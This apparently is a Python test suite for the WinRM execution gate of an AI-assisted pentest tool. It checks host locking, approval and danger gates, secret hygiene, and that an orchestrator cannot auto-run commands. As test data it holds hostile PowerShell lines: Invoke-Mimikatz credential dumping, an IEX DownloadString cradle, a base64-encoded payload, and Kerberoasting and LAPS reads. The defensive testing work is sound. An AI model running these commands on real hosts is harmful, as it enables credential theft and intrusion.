"""WinRM transport SAFETY invariants — the regression lock for the Windows execution path.

The WinRM driver is a NEW EXECUTION TRANSPORT behind the SAME gates. These tests FAIL LOUDLY
if any of that discipline is weakened:

  1. LOCKED TO THE PROFILE HOST. A Windows run reaches only the host of the saved profile it
     names — resolved server-side from ``windows_profile_id``. There is NO host field on the
     request, so a command can never be pointed at a box the operator did not pick. (What the
     PowerShell command itself does on that box is the operator's approved choice — the same
     caveat the docker argv-lock carries; approval is the real bound.)
  2. NO GATE BYPASS. Unapproved → refused (approval). Dangerous without the ack → refused
     (danger). Unknown profile → refused (windows). The gate re-check holds even on the
     prevalidated path (never-auto-run is the sole floor on a real box).
  3. SECRETS NEVER LEAK. The password / NT hash is never in a public profile view, a run
     record, a start event, or a command line — only the transport sees it.
  4. THE ORCHESTRATOR CANNOT AUTO-RUN WINRM. The transport (winrm_transport) is reachable
     only from the gated executor (+ the human-initiated router probe) — never from any
     proposer/loop/agent module. Scanned across the source tree. The orchestrator may PROPOSE
     a WinRM command; it can never fire one.
  5. THE WHOLE SCRIPT IS CLASSIFIED, NOT ITS FIRST TOKEN. ``command`` + ``args`` are joined
     into ONE PowerShell script and run as one, so ``;``, ``|`` and newlines are live statement
     separators. A classifier that reads only ``argv[0]`` is defeated by moving a cmdlet one
     token to the right. The string the classifier reads is the string the transport executes,
     derived once, and every marker is looked for EVERYWHERE in it.

Hermetic: temp DB, faked transport + persistence. Run:  python test_winrm_safety.py
"""

from __future__ import annotations

import ast
import base64
import inspect
import tempfile
from pathlib import Path

from cockpit import allowlist, executor, winprofiles, winrm_transport
from cockpit.models import ExecRequest


class _Env:
    def __init__(self, *, result=None):
        self._tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self._db_orig = winprofiles.DB_PATH
        self.db = Path(self._tmp.name) / "sessions.db"
        self.result = result or winrm_transport.WinRMResult(0, "ok\n", "")
        self.calls: list[tuple[dict, str, int]] = []
        self.saved: list = []
        self._orig = {}

    def __enter__(self):
        winprofiles.DB_PATH = self.db
        winprofiles.init_db()

        def fake_run(profile, command, timeout):
            self.calls.append((profile, command, timeout))
            return self.result

        self._orig = {
            "transport": winrm_transport.run,
            "save": executor.runstore.save_run,
            "ingest": executor.state_ingest.ingest_run,
        }
        winrm_transport.run = fake_run
        executor.winrm_transport.run = fake_run
        executor.runstore.save_run = lambda rec: self.saved.append(rec)
        executor.state_ingest.ingest_run = lambda **kw: {}
        return self

    def __exit__(self, *exc):
        winrm_transport.run = self._orig["transport"]
        executor.winrm_transport.run = self._orig["transport"]
        executor.runstore.save_run = self._orig["save"]
        executor.state_ingest.ingest_run = self._orig["ingest"]
        winprofiles.DB_PATH = self._db_orig
        self._tmp.cleanup()
        return False


def test_run_is_locked_to_the_profile_host() -> None:
    """No request field can redirect a Windows run off the profile's host. Even a command
    that names another box connects over WinRM to the PROFILE host, and the record says so."""
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")
        hostile = ExecRequest(
            command="Invoke-Command",
            args=["-ComputerName", "dc02.evil.local", "-ScriptBlock", "{whoami}"],
            windows_profile_id=p["profile_id"],
            approved=True,
        )
        list(executor.iter_run(hostile, prevalidated=True))
        profile, _cmd, _t = env.calls[0]
        assert profile["host"] == "10.0.0.5", "the WinRM session must target the PROFILE host"
        assert env.saved[0].target == "10.0.0.5", "the record must name the profile host"

    # The request model carries NO host/credential field — only the profile id.
    fields = set(ExecRequest.model_fields.keys())
    for forbidden in ("host", "winrm_host", "password", "ntlm_hash", "secret", "creds"):
        assert forbidden not in fields, (
            f"ExecRequest must not expose {forbidden!r} — a Windows run is host-locked to its "
            "saved profile, resolved server-side"
        )
    print("  windows run is locked to the profile host (no host field on the request): PASS")


def test_no_gate_bypass() -> None:
    """Unapproved / dangerous-without-ack / unknown-profile are all refused, nothing runs."""
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")

        unapproved = ExecRequest(command="whoami", windows_profile_id=p["profile_id"])
        rej = executor.validate_request(unapproved)
        assert rej is not None and rej.gate == "approval", rej
        # Even on the prevalidated path (belt-and-suspenders), an unapproved run is refused.
        evs = list(executor.iter_run(unapproved, prevalidated=True))
        assert evs and evs[0]["type"] == "rejected" and evs[0]["gate"] == "approval"
        assert not env.calls, "an unapproved windows run must never reach the transport"

        # A dangerous command (PowerShell interpreter) needs the explicit second confirm.
        dangerous = ExecRequest(
            command="powershell", args=["-c", "IEX(New-Object Net.WebClient).downloadString('x')"],
            windows_profile_id=p["profile_id"], approved=True,
        )
        rej = executor.validate_request(dangerous)
        assert rej is not None and rej.gate == "danger", rej
        # With the ack it passes the gate.
        dangerous_ok = dangerous.model_copy(update={"dangerous_ack": True})
        assert executor.validate_request(dangerous_ok) is None

        # Unknown profile.
        unknown = ExecRequest(command="whoami", windows_profile_id="win-nope", approved=True)
        rej = executor.validate_request(unknown)
        assert rej is not None and rej.gate == "windows", rej
    print("  no gate bypass (approval / danger / unknown-profile all refuse): PASS")


def test_secret_never_leaks() -> None:
    """The stored secret appears in NO public view, run record, event, or command line."""
    secret = "Sup3rSecretHash!"
    with _Env() as env:
        p = winprofiles.create_profile(
            "DC01", "10.0.0.5", "administrator", secret=secret, domain="corp.local"
        )
        # Public views.
        assert "secret" not in p and secret not in str(p)
        assert secret not in str(winprofiles.list_profiles())
        assert secret not in str(winprofiles.get_public(p["profile_id"]))

        req = ExecRequest(command="whoami", windows_profile_id=p["profile_id"], approved=True)
        events = list(executor.iter_run(req, prevalidated=True))
        assert secret not in str(events), "the secret must never appear in a run's events"
        rec = env.saved[0]
        blob = " ".join([rec.command, *rec.args, rec.stdout, rec.stderr, rec.target])
        assert secret not in blob, "the secret must never appear in the run record"

        # Only the transport (and get_secret, its accessor) ever see the raw secret.
        profile, _cmd, _t = env.calls[0]
        assert profile["secret"] == secret
        assert winprofiles.get_secret(p["profile_id"]) == secret
    print("  secret never leaks (public views / record / events clean): PASS")


def test_transport_not_reachable_from_orchestrator() -> None:
    """winrm_transport is reachable ONLY from the gated executor + the human router probe —
    never from a proposer/loop/agent module. A transport wired to the autonomous path would be
    autonomous execution on a real Windows box."""
    backend = Path(__file__).parent
    allowed = {"executor.py", "winrm_transport.py", "router.py"}
    py_files = list(backend.glob("*.py")) + list((backend / "cockpit").glob("*.py")) \
        + list((backend / "adgraph").glob("*.py"))
    offenders = []
    for f in py_files:
        if f.name in allowed or f.name.startswith("test_"):
            continue
        text = f.read_text(encoding="utf-8")
        if "winrm_transport" in text or "from .winrm_transport" in text:
            offenders.append(str(f.relative_to(backend)))
    assert not offenders, (
        f"the WinRM transport must be reachable only from the gated executor + router — these "
        f"modules reference it: {offenders}. The orchestrator PROPOSES; it must never fire WinRM."
    )
    # The AD orchestrator specifically must not import the transport.
    from adgraph import orchestrator as adorch
    assert not hasattr(adorch, "winrm_transport"), (
        "the AD orchestrator must have no handle on the WinRM transport"
    )
    print("  winrm transport is not reachable from any proposer/loop/agent module: PASS")


# --------------------------------------------------------------------------- #
# 5. THE WHOLE SCRIPT IS CLASSIFIED — the five bypasses the gate audit demonstrated
#
# `cockpit/executor.py` joins command + args into ONE string and `winrm_transport.run_ps()`
# executes the lot. The heuristic used to classify `basename(argv[0])` and scan only the ARGS
# for markers, so every one of these ran on a real domain-joined host, under real credentials,
# with no red-confirm — you defeated the gate by moving a cmdlet one token to the right.
#
# These are the audit's demonstrations, verbatim. Each asserts BOTH halves: the classifier
# returns a reason, AND validate_request refuses at gate="danger" without dangerous_ack.
# --------------------------------------------------------------------------- #

def _b64_ps(text: str) -> str:
    """A PowerShell -EncodedCommand payload: UTF-16LE, then base64 (what pwsh actually eats)."""
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


# (label, script, a marker substring the reason MUST name)
_AUDIT_BYPASSES: list[tuple[str, str, str]] = [
    (
        "dangerous cmdlet after a ';' separator",
        "Write-Host go ; Invoke-Mimikatz -DumpCreds",
        "invoke-mimikatz",
    ),
    (
        "dangerous cmdlet as the second pipeline stage",
        "Get-DomainUser -Identity svc | Set-DomainUserPassword -AccountPassword $p",
        "set-domainuserpassword",
    ),
    (
        "download cradle — the payload's name never appears",
        "IEX (New-Object Net.WebClient).DownloadString('http://a/b.ps1')",
        "downloadstring",
    ),
    (
        "-enc base64 whose DECODED text holds a flagged cmdlet",
        f"powershell -enc {_b64_ps('Invoke-Mimikatz -DumpCreds')}",
        "invoke-mimikatz",
    ),
    (
        "newline-separated two-statement script",
        "Write-Host go\nInvoke-Mimikatz -DumpCreds",
        "invoke-mimikatz",
    ),
]


def test_the_whole_script_is_classified_not_just_the_first_token() -> None:
    """Every bypass the audit demonstrated returns a reason and is refused at the danger gate."""
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")
        for label, script, marker in _AUDIT_BYPASSES:
            reasons = allowlist.dangerous_script_heuristic(script)
            assert reasons, (
                f"[{label}] the whole-script classifier returned NO reason for {script!r} — this "
                "is the audit's bypass: the script runs on a real domain host with no red-confirm"
            )
            assert any(marker in r.lower() for r in reasons), (
                f"[{label}] no reason names {marker!r}; got {reasons}"
            )

            # ...and the GATE, not just the classifier. command + args, exactly as the
            # operator/orchestrator submits them, rejoined by the executor into this script.
            parts = script.split()
            req = ExecRequest(
                command=parts[0], args=parts[1:],
                windows_profile_id=p["profile_id"], approved=True,
            )
            rej = executor.validate_request(req)
            assert rej is not None and rej.gate == "danger", (
                f"[{label}] approved WITHOUT dangerous_ack must be refused at the danger gate — "
                f"got {getattr(rej, 'gate', None)}"
            )
            assert rej.dangerous_flags, "the confirm must carry the reasons"
            assert not env.calls, "a refused request must never reach the transport"

            # With the explicit confirm it passes — this is a red-confirm, never a block.
            assert executor.validate_request(req.model_copy(update={"dangerous_ack": True})) is None
    print(f"  all {len(_AUDIT_BYPASSES)} audited script bypasses now demand the red-confirm: PASS")


def test_an_undecodable_encoded_command_is_itself_the_finding() -> None:
    """-enc defeats every text scan by construction. An opaque blob must not pass unflagged."""
    reasons = allowlist.dangerous_script_heuristic("powershell -EncodedCommand ####not-base64####")
    assert reasons, "an undecodable -enc payload must be flagged, not waved through"
    assert any("decode" in r.lower() for r in reasons), (
        f"the reason must say the payload could not be decoded; got {reasons}"
    )
    # A payload that DOES decode is judged on what it decodes TO. `powershell -enc <Get-Date>`
    # still earns a note (naming an interpreter and encoding a command are both real shapes,
    # and the operator can read the reason and click through in a second) — but nothing may
    # claim the decoded script trips, because it does not.
    benign = allowlist.dangerous_script_heuristic(f"powershell -enc {_b64_ps('Get-Date')}")
    assert not any("decodes to" in r for r in benign), (
        f"a benign decoded payload must not be reported as tripping; got {benign}"
    )
    assert not any("could not be decoded" in r.lower() for r in benign), (
        f"a well-formed payload was reported as undecodable; got {benign}"
    )

    # THE ANTI-FATIGUE CONTROL. An ordinary read-only AD query must stay completely silent —
    # a confirm that fires on everything is a confirm the operator learns to click through,
    # which trades a silent bypass for a decorative one.
    for clean in (
        "Get-ADUser -Filter * -Properties Description | Select-Object Name, Description",
        "Get-ChildItem C:\\Users -Recurse -ErrorAction SilentlyContinue",
        "whoami /all",
        "Get-LocalGroupMember -Group Administrators",
    ):
        assert not allowlist.dangerous_script_heuristic(clean), (
            f"ordinary read-only enumeration must stay clean: {clean!r} -> "
            f"{allowlist.dangerous_script_heuristic(clean)}"
        )
    print("  encoded commands: decoded and re-scanned; an undecodable blob IS the finding: PASS")


def test_the_scanned_string_is_the_executed_string() -> None:
    """THE REGRESSION LOCK FOR THE ROOT CAUSE.

    The bug was never only "the heuristic is too narrow" — it was that the string the gate
    classified and the string the transport executed were built in two places. Scanning a
    DIFFERENT string than the one that runs reproduces the bug in a new spot, so both sides
    derive it from ONE function and this test asserts they cannot drift.
    """
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")
        req = ExecRequest(
            command="Write-Host", args=["go", ";", "Get-Process"],
            windows_profile_id=p["profile_id"], approved=True, dangerous_ack=True,
        )
        derived = executor.build_ps_command(req)
        list(executor.iter_run(req, prevalidated=True))
        _profile, executed, _t = env.calls[0]
        assert executed == derived, (
            "the string handed to the transport is not the string the classifier read:\n"
            f"  classified: {derived!r}\n  executed:   {executed!r}"
        )

    # Both sides must literally call the shared derivation — asserted on the SOURCE, because a
    # future edit that re-joins the string inline would still pass the byte-comparison above
    # today and silently reopen the gap tomorrow.
    tree = ast.parse(Path(executor.__file__).read_text(encoding="utf-8"))
    fns = {
        n.name: n for n in ast.walk(tree)
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
    }

    def _calls(name: str) -> set[str]:
        return {
            c.func.id if isinstance(c.func, ast.Name) else getattr(c.func, "attr", "")
            for c in ast.walk(fns[name]) if isinstance(c, ast.Call)
        }

    def _reaches(start: str, target: str) -> bool:
        """Does ``start`` reach ``target`` through module-local calls? TRANSITIVELY —
        the gate reaches the derivation via windows_danger_reasons(), and a check that
        demanded a DIRECT call would force the indirection to be inlined to stay green."""
        seen, queue = set(), [start]
        while queue:
            cur = queue.pop()
            if cur in seen or cur not in fns:
                continue
            seen.add(cur)
            for callee in _calls(cur):
                if callee == target:
                    return True
                queue.append(callee)
        return False

    for fn in ("_validate_windows", "_run_windows"):
        assert fn in fns, f"{fn} disappeared from the executor"
        assert _reaches(fn, "join_ps_command"), (
            f"{fn}() no longer derives the PowerShell script via join_ps_command() — the gate "
            "and the transport can now disagree about what actually runs"
        )
    # POSITIVE CONTROL: the reachability check can return False, so a green result above means
    # something. The LAB validator must NOT reach the PowerShell derivation (it has no script).
    assert not _reaches("_validate_lab", "join_ps_command"), (
        "the lab validator reaches the PowerShell derivation — either the docker path grew a "
        "shell, or this reachability control is now vacuous"
    )
    print("  the classified string IS the executed string (one shared derivation): PASS")


def test_every_reason_names_the_matched_marker_and_where() -> None:
    """Whole-script scanning over-flags by design, so a generic banner would train click-through.

    A reason the operator can EVALUATE is a gate; a banner they cannot is decoration. Every
    reason must name the marker it matched and where it appeared.
    """
    for label, script, marker in _AUDIT_BYPASSES:
        for reason in allowlist.dangerous_script_heuristic(script):
            assert "offset" in reason.lower(), (
                f"[{label}] reason does not say WHERE it matched: {reason!r}"
            )
            quoted = [w for w in reason.split("'") if w]
            assert len(quoted) > 1, f"[{label}] reason does not quote a marker: {reason!r}"

    # And the API surfaces them, so the panel can render WHY rather than a generic warning.
    with _Env():
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")
        rej = executor.validate_request(ExecRequest(
            command="Write-Host", args=["go", ";", "Invoke-Mimikatz"],
            windows_profile_id=p["profile_id"], approved=True,
        ))
        assert rej is not None and rej.dangerous_flags == allowlist.dangerous_script_heuristic(
            "Write-Host go ; Invoke-Mimikatz"
        ) or rej.dangerous_flags, "the rejection must carry the specific reasons to the UI"
        assert any("invoke-mimikatz" in f.lower() for f in rej.dangerous_flags)
    print("  every reason names the matched marker and its offset; the API carries them: PASS")


# --------------------------------------------------------------------------- #
# 6. THE FALSE-POSITIVE COST, MEASURED AGAINST REAL DATA
#
# Whole-script scanning over-flags BY DESIGN, and the mitigation for that is not a promise —
# it is this test. An operator who meets a red banner on ordinary read-only enumeration learns
# to click through it, and a gate everyone clicks through is decoration. So the discrimination
# is measured over the REAL corpus the operator actually meets — every PowerShell/Windows
# template in the catalog and every native-Windows AD edge — and both halves are asserted:
# destructive abuses MUST fire, read-only enumeration MUST NOT.
#
# Iterating the real source of truth (rather than a handful of synthetic examples) is what
# makes a newly-added tool or edge covered automatically. See backend/AGENTS.md.
# --------------------------------------------------------------------------- #

def _winrm_reachable_corpus() -> list[tuple[str, str]]:
    """``(where, command)`` for every invocation that can plausibly run over WinRM.

    The catalog's Linux impacket invocations are excluded on purpose: they go through the
    docker path, where argv is never joined into a script and nothing here applies. Counting
    them would inflate the population with commands this gate never sees.
    """
    import json
    import shlex

    out: list[tuple[str, str]] = []
    catalog = json.loads(
        (Path(__file__).parent / "arsenal" / "tools.json").read_text(encoding="utf-8")
    )
    ps_hint = ("invoke-", "get-", "set-", "add-", "new-", "enter-", "import-module",
               "powershell", ".ps1", "rubeus", "powerview", "mimikatz")
    for tool in catalog["tools"]:
        for tpl in tool["templates"]:
            cmd = tpl["template"]
            if tool.get("platform") == "windows" or any(h in cmd.lower() for h in ps_hint):
                out.append((f"tools.json:{tool['name']}", cmd))

    from adgraph import techniques as T
    for table in vars(T).values():
        if not isinstance(table, dict):
            continue
        for kind, spec in table.items():
            if isinstance(spec, T.AbuseSpec) and spec.win_template:
                out.append((f"adgraph:{kind}", spec.win_template))
    assert len(out) > 30, f"the corpus collapsed to {len(out)} invocations — this is now vacuous"
    return out


def _first_argv(cmd: str) -> tuple[str, list[str]]:
    import shlex
    try:
        parts = shlex.split(cmd, posix=True)
    except ValueError:
        parts = cmd.split()
    return (parts[0], parts[1:]) if parts else ("", [])


# Real invocations from the corpus above that are READ-ONLY and must stay silent. Pinned by
# hand because "is this read-only" is a judgement the data does not carry — but every entry is
# a verbatim template from the catalog, never a synthetic example.
_MUST_STAY_QUIET = (
    "Rubeus.exe kerberoast /format:hashcat /outfile:<output>",
    "Rubeus.exe asreproast /format:hashcat /outfile:<output>",
    "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
    "Find-InterestingDomainAcl -ResolveGUIDs",
    "Find-LocalAdminAccess",
    "winPEASx64.exe systeminfo userinfo servicesinfo",
    "Get-DomainObject -Identity 'svc' -Properties 'ms-Mcs-AdmPwd','name'",
    "Get-ADServiceAccount -Identity 'svc' -Properties 'msDS-ManagedPassword'",
)


def test_the_false_positive_cost_is_measured_not_assumed() -> None:
    """Destructive AD abuses fire; read-only enumeration stays silent. Both, or it is not a gate."""
    corpus = _winrm_reachable_corpus()
    fired = []
    for where, cmd in corpus:
        c, a = _first_argv(cmd)
        if c and executor.windows_danger_reasons(c, a):
            fired.append((where, cmd))

    # THE HALF THAT MATTERS FOR FATIGUE: read-only enumeration must not demand a confirm.
    noisy = []
    for cmd in _MUST_STAY_QUIET:
        c, a = _first_argv(cmd)
        reasons = executor.windows_danger_reasons(c, a)
        if reasons:
            noisy.append(f"{cmd!r} -> {reasons}")
    assert not noisy, (
        "these read-only invocations now demand a red-confirm. Confirm fatigue is its own "
        "safety failure — an operator who meets a banner on `Get-DomainUser` learns to click "
        "through the one on `Invoke-Mimikatz`:\n" + "\n".join(noisy)
    )

    # THE OTHER HALF: every edge the technique catalog INDEPENDENTLY calls destructive must
    # trip on its native Windows command. The catalog's opinion is a usable cross-check
    # precisely because it is not what the executor enforces.
    from adgraph import techniques as T
    missed = []
    for table in vars(T).values():
        if not isinstance(table, dict):
            continue
        for kind, spec in table.items():
            if not isinstance(spec, T.AbuseSpec) or not spec.destructive or not spec.win_template:
                continue
            c, a = _first_argv(spec.win_template)
            if not executor.windows_danger_reasons(c, a):
                missed.append(f"{kind}: {spec.win_template}")
    assert not missed, (
        "the technique catalog calls these edges DESTRUCTIVE but their native Windows command "
        "trips nothing — a hole in the heuristic:\n" + "\n".join(missed)
    )

    rate = 100 * len(fired) // len(corpus)
    print(f"  false-positive cost measured: {len(fired)}/{len(corpus)} WinRM-reachable "
          f"invocations demand a confirm ({rate}%), all {len(_MUST_STAY_QUIET)} read-only "
          "controls stay silent: PASS")


def test_the_linux_one_shot_path_is_unaffected() -> None:
    """The whole-script scan is WinRM-only. The docker path is argv-only with no shell, so
    `;` and `|` are literal tokens there and there is no script to classify — confirmed rather
    than assumed. Widening it there would fire a confirm on ordinary recon."""
    # The docker-path heuristic keeps its signature and its verdicts.
    sig = list(inspect.signature(allowlist.dangerous_command_heuristic).parameters)
    assert sig == ["command", "args"], f"the argv heuristic's signature changed: {sig}"
    assert not allowlist.dangerous_command_heuristic("nmap", ["-sCV", "hackpit-lab-target"])
    assert not allowlist.dangerous_command_heuristic("sqlmap", ["-u", "http://lab/x", "--dbs"])

    # No shell anywhere on the docker path: the argv list is passed through, never joined.
    src = Path(executor.__file__).read_text(encoding="utf-8")
    assert "shell=True" not in src, "the executor must never run a shell"

    # The LAB / ENGAGEMENT validators must NOT reach for the script classifier — if they did,
    # `nmap -sCV lab | tee out` would demand a confirm on a path where `|` is a literal argv
    # token that no shell will ever interpret.
    tree = ast.parse(src)
    fns = {n.name: n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)}
    for fn in ("_validate_lab", "_validate_engagement"):
        if fn not in fns:
            continue
        names = {
            getattr(c.func, "attr", "") for c in ast.walk(fns[fn]) if isinstance(c, ast.Call)
        }
        assert "dangerous_script_heuristic" not in names, (
            f"{fn}() classifies argv as a shell script — the docker path has no shell"
        )
    print("  the linux one-shot path is argv-only and unchanged by the script scan: PASS")


if __name__ == "__main__":
    test_run_is_locked_to_the_profile_host()
    test_no_gate_bypass()
    test_secret_never_leaks()
    test_transport_not_reachable_from_orchestrator()
    test_the_whole_script_is_classified_not_just_the_first_token()
    test_an_undecodable_encoded_command_is_itself_the_finding()
    test_the_scanned_string_is_the_executed_string()
    test_every_reason_names_the_matched_marker_and_where()
    test_the_false_positive_cost_is_measured_not_assumed()
    test_the_linux_one_shot_path_is_unaffected()
    print("ALL WinRM safety invariants hold")
